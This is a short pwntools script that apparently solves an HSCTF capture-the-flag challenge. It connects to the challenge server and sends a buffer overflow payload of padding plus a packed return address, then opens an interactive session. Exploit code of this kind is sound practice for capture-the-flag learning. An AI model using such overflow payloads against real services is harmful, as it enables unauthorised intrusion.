from pwn import * 

p = remote("pwn.hsctf.com", 1234)
print(p.recv())
payload = 'A'*20
payload += p32(0x080491b6)

p.send(payload)
p.interactive()
